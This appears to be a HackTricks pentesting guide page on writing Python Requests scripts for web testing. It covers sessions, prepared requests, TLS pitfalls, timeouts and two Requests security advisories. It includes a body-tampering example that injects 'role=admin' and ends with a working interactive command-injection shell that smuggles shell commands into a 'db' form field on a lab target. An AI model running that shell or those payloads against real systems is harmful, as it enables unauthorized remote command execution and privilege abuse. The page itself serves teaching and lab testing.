# Web Requests

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

These examples use Requests' documented request arguments, response properties, multipart file tuples, and sessions.<sup>[[1]](#references)</sup> The `verify=False` examples disable TLS certificate verification and should be limited to controlled testing.<sup>[[1]](#references)</sup>

```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
    resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
    return resp

def login(username, password):
    resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
    return resp

def get_info(name):
    resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
    guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
    return guid

def upload(guid, filename, data):
    resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
    guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
    return guid

def json_search(guid, search_string):
    resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
    return resp.json()

def get_random_string(guid, path):
    return ''.join(random.choice(string.ascii_letters) for i in range(10))
```

## Prepared requests for payload control

A `PreparedRequest` exposes the final URL, headers and encoded body before it is sent. Build it with `Session.prepare_request()` (rather than `Request.prepare()`) when session cookies or authentication must be applied; when the prepared-flow must also honor environment proxy/CA settings, explicitly merge them with `merge_environment_settings()`.<sup>[[1]](#references)</sup>

```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```

This is useful when an exploit needs non-standard encoding or when comparing the payload that was constructed with the request stored in `response.request`. It is not a raw-HTTP primitive: Requests stores headers in a case-insensitive mapping, so assigning a duplicate name replaces the previous value. Use a lower-level sender for malformed request lines or distinct duplicate `Content-Length`/`Transfer-Encoding` fields needed by [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md).<sup>[[1]](#references)</sup>

## Session isolation, implicit credentials and TLS state

A session trusts environment configuration by default. If no explicit authentication is supplied, Requests may obtain Basic credentials from `.netrc`; it may also import proxy configuration and CA bundle paths from environment variables. For scripts that fetch attacker-controlled URLs, disable those implicit inputs and configure only the intended lab proxy/CA explicitly. Releases before 2.32.4 could select `.netrc` credentials for the wrong host when given a maliciously crafted URL, while `Session.trust_env = False` is the documented workaround when an upgrade is impossible.<sup>[[1]](#references)[[4]](#references)</sup>

```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
```

Keep a session that uses `verify=False` separate from sessions that require verified TLS. In Requests before 2.32.0, a connection first opened with `verify=False` could be reused for later same-origin requests even when those requests specified `verify=True`; upgrading fixes that pool-state issue, but isolation also makes exploit scripts easier to audit.<sup>[[5]](#references)</sup>

## Reliable exploit loops

Requests has no default timeout. A `(connect, read)` timeout is not a total wall-clock deadline: the read component limits how long the client waits between received bytes. Disable automatic redirects when a target controls `Location`, then validate each hop before sending a new request; if redirects are enabled, inspect `response.history`. For large or hostile responses, `stream=True`, iterate in bounded chunks, and close the response with a context manager so the pooled connection is released.<sup>[[1]](#references)</sup>

```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
    print(r.status_code, r.headers.get("Location"))
    for chunk in r.iter_content(64 * 1024):
        if len(body) + len(chunk) > limit:
            raise ValueError("response exceeds limit")
        body.extend(chunk)
```

## Python cmd to exploit an RCE

The command loop subclasses Python's `Cmd`; its `default` method handles unrecognized command prefixes, `cmdloop` dispatches input lines, and `re.DOTALL` lets the extraction pattern span newlines.<sup>[[2]](#references)[[3]](#references)</sup>

```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
    prompt = "Inject => "

    def default(self, args):
        output = RunCmd(args)
        print(output)

def RunCmd(cmd):
    data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
    r = requests.post('http://10.10.10.127/select', data=data)
    page = r.text
    m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
    if m:
        return m.group(1)
    else:
        return 1


term = Terminal()
term.cmdloop()
```



## References

- [1] [Requests Developer Interface](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Support for line-oriented command interpreters](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Regular expression operations](https://docs.python.org/3/library/re.html)
- [4] [Requests vulnerable to `.netrc` credentials leak via malicious URLs](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [Requests `Session` object does not verify requests after making first request with `verify=False`](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
